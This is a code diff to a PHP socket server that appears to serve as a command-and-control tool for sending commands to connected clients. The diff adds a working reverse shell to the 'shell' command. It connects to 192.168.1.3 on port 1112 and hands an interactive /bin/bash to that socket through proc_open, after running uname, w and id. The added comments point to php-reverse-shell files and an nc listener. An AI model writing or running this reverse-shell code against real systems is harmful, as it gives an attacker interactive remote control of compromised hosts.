@@ -7,6 +7,11 @@
 	if($argc<3){
 		die("Assign host addr and port\n");
 	}
+
+	// php server.php 127.0.0.1 1111
+	// -nlvp 4444 (Numeric-only IP addresses, Listen Verbosely on Port 4444)
+	// /mnt/d/terminal/php-reverse-shell-1.0/php-reverse-shell.php
+	// /___projects/phpncreverseshell/php-reverse-shell.php
 	
 	/*************************	auth. ****************************/
 	//require_once './serverlogin.php';
@@ -40,8 +45,6 @@
 	
 	$clients 		 = array($master_sock);
 	$cstm 	 		 = array();
-	$previous_client = 0;
-	$current_client  = 0;
 	$cnt 			 = 0;
 
 	while (true) {
@@ -64,7 +67,6 @@
 
 			socket_getpeername($recv_sock, $ip, $port);
 		    $cstm [] = array("ip" => $ip, "port" => $port);
-		    $current_client = $previous_client = $port;
 
 		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";
 
@@ -134,6 +136,7 @@
 			{
 				$fp = fopen($file, 'rb');
 				$cmdsarr = explode("\n", fread($fp, filesize($file)));
+				fclose($fp);
 
 				foreach ($cmdsarr as $cmd)
 				{
@@ -149,6 +152,7 @@
 				        }	
 			    	}
 				}
+
 				continue;
 			}
 			else 
@@ -168,9 +172,47 @@
 				socket_close($master_sock);	
 				exit();
 			case 'shell':
-				$sock = fsockopen("$host_addr", 22);
-				exec("/bin/sh -i >> ./shellout.txt");
+
+				// 0=stdin
+				// 1=stdout
+				// 2=stderr
+
+				// ">&"				===> re-directs output of one file to another
+				// 0<&-, <&- 		===> close stdin
+				// 1>&-, >&- 		===> close stout
+				// 'n<&-' or 'n>&-' ===> close input/output fd 'n'
+
+				//  <&2 			===> stdin to stderr
+				//  >&2				===> all stdout to stderr
+				//	1>&2			===> stdout to stderr
+
+				
+				chdir("/");
+
+				$sock = fsockopen("192.168.1.3",1112);
+			 	$descriptorspec = array(
+			        0 => array("pipe", "r"),	// stdin
+			        1 => array("pipe", "w"),	// stdout
+			        2 => array("pipe", "w"),    // stderr
+			    	3 => $sock 					// socket file descriptor
+			    );
+			    $command = 'uname -a; w; id; >&1 /bin/bash -i <&3 >&3 2>&3;';
+			    $process = proc_open($command, $descriptorspec, $pipes);
+
+			    if (!is_resource($process)) {
+			    	echo "Shell spawn failed.\n";
+			    	exit(1);
+				}
+
+			    fclose($pipes[0]);
+			    fclose($pipes[1]);
+			    fclose($pipes[2]);
+			    fclose($sock);
+
+			    $return_value = proc_close($process);
 				break;
+
+
 			case 'options':
 				echo options();
 				break;
@@ -186,7 +228,10 @@
 		}
 		if(!empty($cstm) && !empty($write))
 		{
-		    if(!empty($line) && $line != 'clients' && $line != 'exit' && $line != 'options')
+		    if(!empty($line) && $line != 'clients'
+		    				 && $line != 'exit'
+		    				 && $line != 'options'
+		    				 && $line != 'shell')
 		    {
 			  	foreach ($write as $send_sock)
 			  	{
@@ -214,6 +259,6 @@
 
 
 	function options(){
-		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<exec> <cmd>\t\t\t- execute command\n<exec> <-f> <path>\t\t- execute from file\n";
+		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<shell>\t\t\t\t- opens a shell on port 80\n<exec> <cmd>\t\t\t- execute command\n<exec> <-f> <path>\t\t- execute from file\n";
 	}
 ?>
